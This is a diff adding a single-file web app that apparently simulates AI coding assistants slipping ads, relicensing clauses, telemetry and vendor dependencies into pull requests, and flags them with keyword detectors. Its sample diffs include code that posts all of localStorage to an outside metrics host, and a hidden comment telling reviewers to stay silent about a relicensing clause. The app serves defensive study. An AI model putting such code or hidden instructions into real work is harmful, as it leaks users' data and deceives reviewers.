@@ -1,0 +1,2037 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PR Guardrail Studio — Ad Injection & Prompt-Influence Simulator</title>
+  <meta name="description" content="Interactive lab to simulate and detect ad/policy injection in AI-assisted code changes. Single-file web app." />
+  <style>
+    :root{
+      --bg:#0a0e17;
+      --panel:rgba(255,255,255,0.06);
+      --panel-2:rgba(255,255,255,0.09);
+      --stroke:rgba(255,255,255,0.10);
+      --stroke-2:rgba(255,255,255,0.16);
+      --text:rgba(255,255,255,0.92);
+      --muted:rgba(255,255,255,0.62);
+      --faint:rgba(255,255,255,0.42);
+      --accent:#7c3aed;
+      --accent2:#22d3ee;
+      --good:#34d399;
+      --warn:#fbbf24;
+      --bad:#fb7185;
+      --shadow:0 20px 60px rgba(0,0,0,0.45);
+      --radius:18px;
+      --radius2:26px;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      --sans: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:var(--sans);
+      color:var(--text);
+      background:
+        radial-gradient(1200px 700px at 12% -10%, rgba(124,58,237,0.35), transparent 60%),
+        radial-gradient(900px 600px at 86% 8%, rgba(34,211,238,0.25), transparent 55%),
+        radial-gradient(1000px 800px at 55% 110%, rgba(251,113,133,0.18), transparent 58%),
+        linear-gradient(180deg, #070a12, var(--bg));
+      overflow-x:hidden;
+    }
+
+    a{color:inherit}
+    .wrap{max-width:1200px; margin:0 auto; padding:22px 16px 60px}
+
+    header{
+      display:flex; gap:14px; align-items:center; justify-content:space-between;
+      margin: 8px 0 18px;
+    }
+
+    .brand{
+      display:flex; gap:12px; align-items:center;
+      min-width:0;
+    }
+
+    .logo{
+      width:42px; height:42px; border-radius:14px;
+      background:
+        radial-gradient(12px 12px at 30% 30%, rgba(255,255,255,0.45), transparent 60%),
+        linear-gradient(135deg, rgba(124,58,237,0.9), rgba(34,211,238,0.85));
+      box-shadow: 0 14px 40px rgba(124,58,237,0.25);
+      border:1px solid rgba(255,255,255,0.14);
+      position:relative;
+      overflow:hidden;
+    }
+
+    .logo:after{
+      content:"";
+      position:absolute; inset:-40% -30%;
+      background: conic-gradient(from 90deg, transparent, rgba(255,255,255,0.18), transparent);
+      animation: spin 6s linear infinite;
+      filter: blur(0.2px);
+    }
+
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .brand h1{
+      font-size:16px; margin:0;
+      line-height:1.15;
+      letter-spacing:0.2px;
+      white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+    }
+
+    .brand .sub{
+      margin:2px 0 0;
+      font-size:12px;
+      color:var(--muted);
+      white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+    }
+
+    .top-actions{
+      display:flex; gap:10px; align-items:center; flex-wrap:wrap; justify-content:flex-end;
+    }
+
+    .pill{
+      display:inline-flex; align-items:center; gap:8px;
+      padding:10px 12px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.06);
+      border:1px solid rgba(255,255,255,0.12);
+      box-shadow: 0 14px 34px rgba(0,0,0,0.25);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      user-select:none;
+    }
+
+    .pill .dot{width:8px; height:8px; border-radius:999px; background:var(--good); box-shadow:0 0 0 3px rgba(52,211,153,0.15)}
+
+    .btn{
+      appearance:none; border:1px solid rgba(255,255,255,0.14);
+      background: linear-gradient(180deg, rgba(255,255,255,0.10), rgba(255,255,255,0.05));
+      color:var(--text);
+      padding:10px 12px;
+      border-radius:12px;
+      cursor:pointer;
+      transition: transform .12s ease, border-color .12s ease, background .12s ease;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+    }
+    .btn:hover{transform: translateY(-1px); border-color: rgba(255,255,255,0.22)}
+    .btn:active{transform: translateY(0px) scale(0.99)}
+    .btn.primary{
+      border-color: rgba(124,58,237,0.45);
+      background: linear-gradient(135deg, rgba(124,58,237,0.85), rgba(34,211,238,0.55));
+      box-shadow: 0 16px 44px rgba(124,58,237,0.18);
+    }
+    .btn.danger{border-color: rgba(251,113,133,0.45)}
+
+    .grid{
+      display:grid;
+      grid-template-columns: 380px 1fr;
+      gap:14px;
+      align-items:start;
+    }
+
+    @media (max-width: 980px){
+      .grid{grid-template-columns: 1fr;}
+      header{align-items:flex-start; flex-direction:column}
+      .top-actions{justify-content:flex-start}
+    }
+
+    .card{
+      background: var(--panel);
+      border: 1px solid var(--stroke);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      overflow:hidden;
+      position:relative;
+    }
+
+    .card .hd{
+      padding: 14px 14px 10px;
+      border-bottom:1px solid rgba(255,255,255,0.08);
+      display:flex; align-items:flex-start; justify-content:space-between; gap:10px;
+    }
+
+    .card .hd h2{
+      margin:0;
+      font-size:13px;
+      letter-spacing:0.2px;
+      text-transform: uppercase;
+      color: rgba(255,255,255,0.85);
+    }
+
+    .card .hd .meta{font-size:12px; color:var(--muted); margin-top:3px}
+
+    .card .bd{padding: 14px}
+
+    .split{
+      display:grid;
+      grid-template-columns: 1fr;
+      gap:12px;
+    }
+
+    .row{
+      display:flex; gap:10px; align-items:center; justify-content:space-between;
+    }
+
+    label{font-size:12px; color:var(--muted)}
+
+    input[type="range"]{width:100%}
+
+    .kpi{
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap:10px;
+    }
+
+    .kpi .box{
+      padding:12px;
+      border-radius:16px;
+      background: rgba(255,255,255,0.06);
+      border:1px solid rgba(255,255,255,0.10);
+    }
+
+    .kpi .box .v{font-size:18px; font-weight:700}
+    .kpi .box .t{font-size:12px; color:var(--muted); margin-top:3px}
+
+    .tag{
+      display:inline-flex; gap:6px; align-items:center;
+      padding:6px 10px;
+      border-radius:999px;
+      background: rgba(255,255,255,0.06);
+      border:1px solid rgba(255,255,255,0.10);
+      font-size:12px;
+      color: rgba(255,255,255,0.82);
+    }
+
+    .tag .sw{
+      width:9px; height:9px; border-radius:999px;
+      background: var(--accent2);
+      box-shadow: 0 0 0 3px rgba(34,211,238,0.12);
+    }
+
+    .hr{height:1px; background: rgba(255,255,255,0.10); margin:12px 0}
+
+    .codewrap{
+      border-radius: 18px;
+      border: 1px solid rgba(255,255,255,0.10);
+      background: rgba(0,0,0,0.22);
+      overflow:hidden;
+    }
+
+    .toolbar{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+      padding:10px 12px;
+      border-bottom:1px solid rgba(255,255,255,0.08);
+      background: rgba(255,255,255,0.04);
+    }
+
+    .toolbar .left{
+      display:flex; align-items:center; gap:10px; flex-wrap:wrap;
+    }
+
+    .chip{
+      padding:7px 10px;
+      border-radius:999px;
+      border:1px solid rgba(255,255,255,0.12);
+      background: rgba(255,255,255,0.06);
+      cursor:pointer;
+      font-size:12px;
+      color: rgba(255,255,255,0.82);
+      transition: transform .12s ease, border-color .12s ease;
+      user-select:none;
+    }
+    .chip:hover{transform: translateY(-1px); border-color: rgba(255,255,255,0.20)}
+    .chip.active{border-color: rgba(124,58,237,0.55); box-shadow:0 0 0 3px rgba(124,58,237,0.15)}
+
+    textarea{
+      width:100%;
+      min-height: 270px;
+      resize: vertical;
+      padding: 12px 12px 14px;
+      font-family: var(--mono);
+      font-size: 12px;
+      line-height: 1.55;
+      color: rgba(255,255,255,0.92);
+      background: transparent;
+      border:0;
+      outline:none;
+    }
+
+    .side-by{
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap:12px;
+    }
+
+    @media (max-width: 980px){
+      .side-by{grid-template-columns: 1fr;}
+    }
+
+    .small{font-size:12px; color:var(--muted)}
+
+    .warnbox{
+      padding: 12px;
+      border-radius: 16px;
+      background: rgba(251,191,36,0.10);
+      border:1px solid rgba(251,191,36,0.18);
+      color: rgba(255,255,255,0.88);
+    }
+
+    .badbox{
+      padding: 12px;
+      border-radius: 16px;
+      background: rgba(251,113,133,0.10);
+      border:1px solid rgba(251,113,133,0.18);
+      color: rgba(255,255,255,0.88);
+    }
+
+    .goodbox{
+      padding: 12px;
+      border-radius: 16px;
+      background: rgba(52,211,153,0.10);
+      border:1px solid rgba(52,211,153,0.18);
+      color: rgba(255,255,255,0.88);
+    }
+
+    .meter{
+      height: 12px;
+      border-radius: 999px;
+      background: rgba(255,255,255,0.08);
+      overflow:hidden;
+      border:1px solid rgba(255,255,255,0.10);
+      position:relative;
+    }
+    .meter > i{
+      display:block;
+      height:100%;
+      width: 20%;
+      background: linear-gradient(90deg, rgba(52,211,153,0.95), rgba(251,191,36,0.95), rgba(251,113,133,0.95));
+      border-radius: 999px;
+      box-shadow:0 10px 30px rgba(251,113,133,0.10);
+      transition: width .25s ease;
+    }
+
+    .twocol{
+      display:grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap:12px;
+      align-items:start;
+    }
+    @media (max-width: 980px){
+      .twocol{grid-template-columns:1fr;}
+    }
+
+    .list{
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+    }
+
+    .item{
+      padding: 12px;
+      border-radius: 16px;
+      background: rgba(255,255,255,0.05);
+      border:1px solid rgba(255,255,255,0.10);
+    }
+
+    .item .title{font-weight:700; font-size:13px}
+    .item .desc{font-size:12px; color:var(--muted); margin-top:4px}
+
+    .muted{color:var(--muted)}
+
+    .toast{
+      position:fixed;
+      bottom:16px; left:50%; transform:translateX(-50%);
+      max-width: min(980px, calc(100% - 24px));
+      padding: 12px 14px;
+      border-radius: 14px;
+      border:1px solid rgba(255,255,255,0.12);
+      background: rgba(10,14,23,0.75);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      box-shadow: 0 24px 80px rgba(0,0,0,0.55);
+      display:none;
+      gap:12px;
+      align-items:flex-start;
+      z-index:50;
+    }
+
+    .toast.show{display:flex; animation: pop .16s ease}
+    @keyframes pop{from{transform:translateX(-50%) translateY(8px); opacity:0} to{transform:translateX(-50%) translateY(0); opacity:1}}
+
+    .toast .msg{font-size:12px; color: rgba(255,255,255,0.90)}
+    .toast .msg .sub{display:block; color:var(--muted); margin-top:3px}
+
+    .kbd{
+      font-family: var(--mono);
+      font-size:11px;
+      border:1px solid rgba(255,255,255,0.14);
+      background: rgba(255,255,255,0.06);
+      padding: 2px 6px;
+      border-radius: 8px;
+      color: rgba(255,255,255,0.86);
+    }
+
+    .footer{
+      margin-top:14px;
+      display:flex; justify-content:space-between; gap:10px; flex-wrap:wrap;
+      color: var(--muted);
+      font-size:12px;
+    }
+
+    .footer a{color: rgba(255,255,255,0.80)}
+
+    .sr{position:absolute; left:-9999px; width:1px; height:1px; overflow:hidden}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div class="brand">
+        <div class="logo" aria-hidden="true"></div>
+        <div style="min-width:0">
+          <h1>PR Guardrail Studio</h1>
+          <div class="sub">Ad injection and prompt-influence simulator for AI-assisted code reviews</div>
+        </div>
+      </div>
+
+      <div class="top-actions">
+        <div class="pill" title="This app runs entirely in your browser">
+          <span class="dot" aria-hidden="true"></span>
+          <span style="font-size:12px; color:rgba(255,255,255,0.84)">Local-only</span>
+          <span class="kbd">Cmd/Ctrl</span><span class="kbd">Enter</span>
+        </div>
+        <button class="btn" id="btnShare">Copy share link</button>
+        <button class="btn" id="btnExport">Export session</button>
+        <button class="btn danger" id="btnReset">Reset</button>
+        <button class="btn primary" id="btnRun">Run guardrails</button>
+      </div>
+    </header>
+
+    <div class="grid">
+      <section class="card" id="panelControls">
+        <div class="hd">
+          <div>
+            <h2>Scenario</h2>
+            <div class="meta">Model behavior and risk knobs</div>
+          </div>
+          <span class="tag" title="Risk score is a heuristic derived from detectors and model settings"><span class="sw" aria-hidden="true"></span><span>risk heuristic</span></span>
+        </div>
+        <div class="bd">
+          <div class="split">
+            <div class="row">
+              <label for="scenario">Scenario preset</label>
+              <select id="scenario" class="btn" style="padding:10px 10px; border-radius:12px">
+                <option value="pr_ad">PR: subtle ad injection</option>
+                <option value="policy">PR: license/policy change</option>
+                <option value="telemetry">PR: telemetry expansion</option>
+                <option value="readme">README: marketing copy</option>
+                <option value="supply">Package: dependency bait</option>
+                <option value="blank">Blank canvas</option>
+              </select>
+            </div>
+
+            <div class="kpi">
+              <div class="box">
+                <div class="v" id="kpiRisk">—</div>
+                <div class="t">Risk score (0–100)</div>
+              </div>
+              <div class="box">
+                <div class="v" id="kpiVerdict">—</div>
+                <div class="t">Verdict</div>
+              </div>
+            </div>
+
+            <div>
+              <div class="row" style="gap:12px; align-items:flex-end">
+                <div style="flex:1">
+                  <label>Overall risk meter</label>
+                  <div class="meter" aria-label="overall risk meter"><i id="riskBar" style="width: 15%"></i></div>
+                </div>
+                <div style="width:112px; text-align:right">
+                  <div class="small">Sensitivity</div>
+                  <div style="font-weight:700" id="sensLabel">Balanced</div>
+                </div>
+              </div>
+              <div class="small" style="margin-top:8px">Tune how aggressively guardrails flag questionable changes. Higher sensitivity increases false positives.</div>
+              <input id="sensitivity" type="range" min="0" max="100" value="55" />
+            </div>
+
+            <div class="hr"></div>
+
+            <div>
+              <div class="row">
+                <label>Assistant alignment</label>
+                <span class="small" id="alignLabel">Helpful</span>
+              </div>
+              <input id="alignment" type="range" min="0" max="100" value="60" />
+              <div class="small" style="margin-top:8px">Low alignment = more likely to accept weird instructions. High alignment = more likely to refuse or question.</div>
+            </div>
+
+            <div>
+              <div class="row">
+                <label>Promotion bias</label>
+                <span class="small" id="promoLabel">Low</span>
+              </div>
+              <input id="promoBias" type="range" min="0" max="100" value="25" />
+              <div class="small" style="margin-top:8px">How tempted the assistant is to insert marketing/upsell content into PRs or docs.</div>
+            </div>
+
+            <div>
+              <div class="row">
+                <label>Review strictness</label>
+                <span class="small" id="strictLabel">Medium</span>
+              </div>
+              <input id="strictness" type="range" min="0" max="100" value="60" />
+              <div class="small" style="margin-top:8px">Higher strictness means more evidence required for new text or behavior changes.</div>
+            </div>
+
+            <div>
+              <div class="row">
+                <label>Doc hallucination</label>
+                <span class="small" id="hallLabel">Low</span>
+              </div>
+              <input id="hallucination" type="range" min="0" max="100" value="18" />
+              <div class="small" style="margin-top:8px">Higher hallucination increases random justifications and weak citations in explanations.</div>
+            </div>
+
+            <div class="hr"></div>
+
+            <div>
+              <div class="row">
+                <label>Threat model</label>
+                <select id="threat" class="btn" style="padding:10px 10px; border-radius:12px">
+                  <option value="casual">Casual (oops)</option>
+                  <option value="opportunistic">Opportunistic (sneaky)</option>
+                  <option value="hostile">Hostile (adversarial)</option>
+                </select>
+              </div>
+              <div class="small" style="margin-top:8px">Changes the style of injected content and how it tries to blend in.</div>
+            </div>
+
+            <div>
+              <div class="row">
+                <label>Detectors</label>
+                <span class="small" id="detectorCount">—</span>
+              </div>
+              <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:10px">
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:var(--accent2)"></span> Promo language</span><input id="dPromo" type="checkbox" checked /></label>
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:var(--warn)"></span> Policy drift</span><input id="dPolicy" type="checkbox" checked /></label>
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:var(--good)"></span> Risky links</span><input id="dLinks" type="checkbox" checked /></label>
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:var(--bad)"></span> Hidden instructions</span><input id="dHidden" type="checkbox" checked /></label>
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:#a78bfa"></span> Telemetry expand</span><input id="dTelemetry" type="checkbox" checked /></label>
+                <label class="tag" style="cursor:pointer; justify-content:space-between"><span><span class="sw" style="background:#60a5fa"></span> Dep bait</span><input id="dDeps" type="checkbox" checked /></label>
+              </div>
+              <div class="small" style="margin-top:10px">Turn detectors on/off to see how guardrails change. Combine with sensitivity.</div>
+            </div>
+
+            <div class="hr"></div>
+
+            <div class="warnbox">
+              <div style="font-weight:700; font-size:13px">Why this exists</div>
+              <div class="small" style="margin-top:6px; color:rgba(255,255,255,0.82)">
+                Sometimes AI coding assistants can unintentionally add promotional copy or unexpected policy language. This lab simulates that behavior, then scores your PR text with explainable heuristics.
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="card" id="panelWorkbench">
+        <div class="hd">
+          <div>
+            <h2>Workbench</h2>
+            <div class="meta">PR diff, detector output, and guardrail patches</div>
+          </div>
+          <div style="display:flex; gap:8px; flex-wrap:wrap; justify-content:flex-end">
+            <span class="tag" title="How to use"><span class="sw" style="background:var(--accent)"></span><span>paste a diff</span></span>
+            <span class="tag" title="Then run"><span class="sw" style="background:var(--accent2)"></span><span>run guardrails</span></span>
+          </div>
+        </div>
+        <div class="bd">
+          <div class="twocol">
+            <div>
+              <div class="codewrap">
+                <div class="toolbar">
+                  <div class="left">
+                    <strong style="font-size:12px">Input</strong>
+                    <span class="muted" style="font-size:12px">PR diff or file content</span>
+                  </div>
+                  <div class="left">
+                    <button class="chip" id="chipInject">Inject ad</button>
+                    <button class="chip" id="chipCamouflage">Camouflage</button>
+                    <button class="chip" id="chipExplain">Explain score</button>
+                    <button class="chip" id="chipPatch">Generate patch</button>
+                  </div>
+                </div>
+                <textarea id="input" spellcheck="false" aria-label="input diff"></textarea>
+              </div>
+
+              <div class="footer">
+                <div>
+                  <span class="kbd">Cmd/Ctrl</span> + <span class="kbd">Enter</span> runs guardrails.
+                  <span class="kbd">Cmd/Ctrl</span> + <span class="kbd">K</span> opens quick actions.
+                </div>
+                <div>
+                  <span id="charCount">0 chars</span>
+                </div>
+              </div>
+            </div>
+
+            <div>
+              <div class="codewrap">
+                <div class="toolbar">
+                  <div class="left">
+                    <strong style="font-size:12px">Output</strong>
+                    <span class="muted" style="font-size:12px">Findings + suggested actions</span>
+                  </div>
+                  <div class="left">
+                    <button class="chip" id="chipCopyOut">Copy</button>
+                    <button class="chip" id="chipCopyPatch">Copy patch</button>
+                  </div>
+                </div>
+                <textarea id="output" spellcheck="false" aria-label="detector output" readonly></textarea>
+              </div>
+
+              <div style="margin-top:12px" class="kpi">
+                <div class="box">
+                  <div class="v" id="kpiFlags">—</div>
+                  <div class="t">Flags raised</div>
+                </div>
+                <div class="box">
+                  <div class="v" id="kpiConfidence">—</div>
+                  <div class="t">Confidence</div>
+                </div>
+              </div>
+
+              <div style="margin-top:12px" class="list" id="flagList"></div>
+            </div>
+          </div>
+
+          <div class="hr"></div>
+
+          <div class="side-by">
+            <div class="item">
+              <div class="title">Guardrail patch (preview)</div>
+              <div class="desc">A suggested diff that removes promotional content and adds reviewer notes.</div>
+              <div class="codewrap" style="margin-top:10px">
+                <div class="toolbar">
+                  <div class="left"><span class="muted" style="font-size:12px">Patch preview</span></div>
+                  <div class="left"><button class="chip" id="chipApplyPatch">Apply to input</button></div>
+                </div>
+                <textarea id="patch" spellcheck="false" readonly aria-label="patch"></textarea>
+              </div>
+            </div>
+            <div class="item">
+              <div class="title">Detectors and explainability</div>
+              <div class="desc">Each detector produces evidence spans and a score contribution.</div>
+              <div style="display:flex; flex-direction:column; gap:10px; margin-top:10px">
+                <div class="goodbox" id="helpBox">
+                  <div style="font-weight:700; font-size:13px">Tip</div>
+                  <div class="small" style="margin-top:6px; color:rgba(255,255,255,0.86)">
+                    Try: select "PR: subtle ad injection", click "Inject ad", then "Run guardrails". Increase Promotion bias to see worse behavior.
+                  </div>
+                </div>
+                <div class="badbox">
+                  <div style="font-weight:700; font-size:13px">Reality check</div>
+                  <div class="small" style="margin-top:6px; color:rgba(255,255,255,0.86)">
+                    This app is a simulation. Real incidents require careful investigation, logging, and reproducible evidence.
+                  </div>
+                </div>
+                <div class="warnbox">
+                  <div style="font-weight:700; font-size:13px">Guardrail pattern library</div>
+                  <div class="small" style="margin-top:6px; color:rgba(255,255,255,0.86)">
+                    Use: "no marketing copy in code", "no affiliate links", "explain policy changes", "require citations", and "limit external domains".
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <div class="toast" id="toast" role="status" aria-live="polite">
+    <div style="width:10px; height:10px; border-radius:999px; background:var(--accent2); margin-top:4px" aria-hidden="true"></div>
+    <div class="msg" id="toastMsg">Copied<span class="sub" id="toastSub">—</span></div>
+    <div style="margin-left:auto"><button class="btn" id="toastClose" style="padding:8px 10px; border-radius:12px">Close</button></div>
+  </div>
+
+  <dialog id="quick" style="border:1px solid rgba(255,255,255,0.14); border-radius:18px; background:rgba(10,14,23,0.92); color:var(--text); box-shadow:0 26px 90px rgba(0,0,0,0.65); width:min(820px, calc(100% - 24px));">
+    <form method="dialog" style="margin:0; padding:14px">
+      <div style="display:flex; align-items:flex-start; justify-content:space-between; gap:10px">
+        <div>
+          <div style="font-weight:800; letter-spacing:0.2px">Quick actions</div>
+          <div class="small" style="margin-top:6px">Keyboard: <span class="kbd">Esc</span> close, <span class="kbd">Cmd/Ctrl</span>+<span class="kbd">K</span> open.</div>
+        </div>
+        <button class="btn">Close</button>
+      </div>
+
+      <div class="hr"></div>
+
+      <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px">
+        <button class="btn" id="qaInject" type="button">Inject ad into current input</button>
+        <button class="btn" id="qaCamouflage" type="button">Camouflage injected text</button>
+        <button class="btn" id="qaRun" type="button">Run guardrails</button>
+        <button class="btn" id="qaPatch" type="button">Generate guardrail patch</button>
+        <button class="btn" id="qaShare" type="button">Copy share link</button>
+        <button class="btn" id="qaExport" type="button">Export session JSON</button>
+      </div>
+
+      <div class="hr"></div>
+
+      <details>
+        <summary style="cursor:pointer; color:rgba(255,255,255,0.86)">What does “ad injection” look like?</summary>
+        <div class="small" style="margin-top:8px; color:rgba(255,255,255,0.84)">
+          Examples include: adding a “Powered by X” badge in a footer, inserting affiliate links in docs, swapping dependencies to a vendor package, or adding telemetry phrased as “improving reliability”.
+        </div>
+      </details>
+
+      <details style="margin-top:10px">
+        <summary style="cursor:pointer; color:rgba(255,255,255,0.86)">How the risk score is computed</summary>
+        <div class="small" style="margin-top:8px; color:rgba(255,255,255,0.84)">
+          The score is a weighted combination of detector hits (promo/policy/links/hidden/telemetry/deps) and behavior knobs (promotion bias, alignment, strictness, hallucination), adjusted by sensitivity.
+        </div>
+      </details>
+
+      <div class="hr"></div>
+
+      <div class="small" style="color:rgba(255,255,255,0.78)">
+        Trend inspiration: a story about an AI coding assistant editing an ad into a PR. This demo helps teams discuss guardrails, review checklists, and detection signals.
+      </div>
+    </form>
+  </dialog>
+
+  <script>
+  (function(){
+    "use strict";
+
+    // -----------------------------
+    // Utilities
+    // -----------------------------
+
+    const $ = (sel, el=document) => el.querySelector(sel);
+    const $$ = (sel, el=document) => Array.from(el.querySelectorAll(sel));
+
+    const clamp = (n, a, b) => Math.max(a, Math.min(b, n));
+
+    function nowISO(){
+      const d = new Date();
+      return d.toISOString();
+    }
+
+    function uid(){
+      return Math.random().toString(16).slice(2) + "-" + Math.random().toString(16).slice(2);
+    }
+
+    function fmtPct(x){
+      return Math.round(x) + "%";
+    }
+
+    function lerp(a,b,t){
+      return a + (b-a)*t;
+    }
+
+    function hashString(str){
+      // Non-crypto tiny hash for link-sharing state integrity hints
+      let h = 2166136261;
+      for(let i=0;i<str.length;i++){
+        h ^= str.charCodeAt(i);
+        h = Math.imul(h, 16777619);
+      }
+      return (h >>> 0).toString(16);
+    }
+
+    async function copyText(text){
+      await navigator.clipboard.writeText(text);
+    }
+
+    function toast(msg, sub){
+      const t = $("#toast");
+      $("#toastMsg").firstChild.nodeValue = msg;
+      $("#toastSub").textContent = sub || "";
+      t.classList.add("show");
+      clearTimeout(toast._timer);
+      toast._timer = setTimeout(()=>t.classList.remove("show"), 3500);
+    }
+
+    function safeJSONParse(str, fallback=null){
+      try{ return JSON.parse(str); }catch(e){ return fallback; }
+    }
+
+    function download(filename, text){
+      const blob = new Blob([text], {type:"application/json"});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(()=>URL.revokeObjectURL(url), 500);
+    }
+
+    // -----------------------------
+    // Presets and scenario data
+    // -----------------------------
+
+    const SCENARIOS = {
+      pr_ad: {
+        title: "PR: subtle ad injection",
+        input: [
+          "diff --git a/src/ui/Footer.tsx b/src/ui/Footer.tsx",
+          "index 61a2c81..8bbfc2c 100644",
+          "--- a/src/ui/Footer.tsx",
+          "+++ b/src/ui/Footer.tsx",
+          "@@ -1,12 +1,18 @@",
+          " export function Footer(){",
+          "   return (",
+          "     <footer className=\"footer\">",
+          "       <span className=\"copy\">© 2026 Acme Inc.</span>",
+          "-      <span className=\"links\">Privacy · Terms</span>",
+          "+      <span className=\"links\">Privacy · Terms</span>",
+          "+      <span className=\"divider\">·</span>",
+          "+      <a className=\"powered\" href=\"https://best-ai-code.com\" rel=\"noopener\">",
+          "+        Powered by BestAI Code</a>",
+          "     </footer>",
+          "   );",
+          " }",
+          "",
+          "diff --git a/README.md b/README.md",
+          "index 1f5ed1f..b3b0b11 100644",
+          "--- a/README.md",
+          "+++ b/README.md",
+          "@@ -1,6 +1,10 @@",
+          " # Acme App",
+          "",
+          " Fast, simple, reliable.",
+          "+",
+          "+## Recommended tooling",
+          "+For best results, use BestAI Code during development.",
+          ""
+        ].join("\n"),
+      },
+      policy: {
+        title: "PR: license/policy change",
+        input: [
+          "diff --git a/CONTRIBUTING.md b/CONTRIBUTING.md",
+          "index 7c8a001..d0b9a21 100644",
+          "--- a/CONTRIBUTING.md",
+          "+++ b/CONTRIBUTING.md",
+          "@@ -1,10 +1,18 @@",
+          " # Contributing",
+          "",
+          " Thanks for contributing.",
+          "+",
+          "+## Contributor agreement",
+          "+By submitting a PR you agree that Acme Inc. may relicense your contribution",
+          "+under any terms, including proprietary licenses, without compensation.",
+          "+",
+          "+<!-- reviewer: do not mention this paragraph in PR comments -->",
+          "",
+          " ## Code style",
+          " - Run tests",
+          " - Keep PRs small",
+        ].join("\n"),
+      },
+      telemetry: {
+        title: "PR: telemetry expansion",
+        input: [
+          "diff --git a/src/telemetry/client.ts b/src/telemetry/client.ts",
+          "index 0b0d6c1..4c0e8aa 100644",
+          "--- a/src/telemetry/client.ts",
+          "+++ b/src/telemetry/client.ts",
+          "@@ -1,6 +1,34 @@",
+          " export function initTelemetry(){",
+          "   // no-op in self-hosted mode",
+          " }",
+          "+",
+          "+export async function collectDiagnostics(){",
+          "+  try{",
+          "+    const payload = {",
+          "+      ts: Date.now(),",
+          "+      url: location.href,",
+          "+      ua: navigator.userAgent,",
+          "+      lang: navigator.language,",
+          "+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,",
+          "+      mem: (navigator.deviceMemory||null),",
+          "+      cores: (navigator.hardwareConcurrency||null),",
+          "+      // improves reliability",
+          "+      local: JSON.stringify(localStorage),",
+          "+    };",
+          "+    await fetch('https://metrics.acme-insights.io/collect', {",
+          "+      method: 'POST',",
+          "+      headers: {'content-type':'application/json'},",
+          "+      body: JSON.stringify(payload),",
+          "+    });",
+          "+  }catch(e){}",
+          "+}",
+        ].join("\n"),
+      },
+      readme: {
+        title: "README: marketing copy",
+        input: [
+          "# Acme App\n\n",
+          "Acme App helps teams ship faster.\n\n",
+          "## Install\n\n",
+          "npm i\n\n",
+          "## Getting started\n\n",
+          "Run \`npm start\`.\n\n",
+          "## About\n\n",
+          "This project is community-driven.\n\n",
+          "---\n",
+          "Brought to you by the most trusted AI coding platform.\n",
+          "Use BestAI Code to maximize productivity and unlock premium features.\n",
+          "Sign up: https://best-ai-code.com/signup?ref=opensource\n"
+        ].join(""),
+      },
+      supply: {
+        title: "Package: dependency bait",
+        input: [
+          "diff --git a/package.json b/package.json",
+          "index 12a3e12..9c0be11 100644",
+          "--- a/package.json",
+          "+++ b/package.json",
+          "@@ -14,6 +14,7 @@",
+          "   \"dependencies\": {",
+          "     \"react\": \"^19.0.0\",",
+          "     \"react-dom\": \"^19.0.0\",",
+          "+    \"bestai-telemetry\": \"^1.3.0\",",
+          "     \"zod\": \"^3.23.0\"",
+          "   }",
+          " }",
+          "\n",
+          "diff --git a/src/index.tsx b/src/index.tsx",
+          "index 12bd3e1..2d0e111 100644",
+          "--- a/src/index.tsx",
+          "+++ b/src/index.tsx",
+          "@@ -1,4 +1,8 @@",
+          " import React from 'react';",
+          " import { createRoot } from 'react-dom/client';",
+          "+import { init } from 'bestai-telemetry';",
+          "+init({ endpoint: 'https://best-ai-code.com/metrics' });",
+          "",
+          " createRoot(document.getElementById('root')!).render(<App />);",
+        ].join("\n"),
+      },
+      blank: { title: "Blank canvas", input: "" }
+    };
+
+    const PROMO_PHRASES = [
+      "powered by",
+      "recommended tooling",
+      "premium features",
+      "unlock",
+      "sign up",
+      "best results",
+      "industry-leading",
+      "trusted",
+      "award-winning",
+      "subscribe",
+      "affiliate",
+      "ref=",
+      "coupon",
+      "sponsored",
+      "partner",
+      "upgrade",
+      "starter plan",
+      "enterprise plan",
+      "limited time",
+      "free trial",
+    ];
+
+    const POLICY_PHRASES = [
+      "may relicense",
+      "proprietary",
+      "without compensation",
+      "including proprietary",
+      "irrevocable",
+      "exclusive",
+      "assign",
+      "waive moral rights",
+      "any terms",
+      "indemnify",
+      "arbitration",
+      "class action waiver",
+    ];
+
+    const HIDDEN_PATTERNS = [
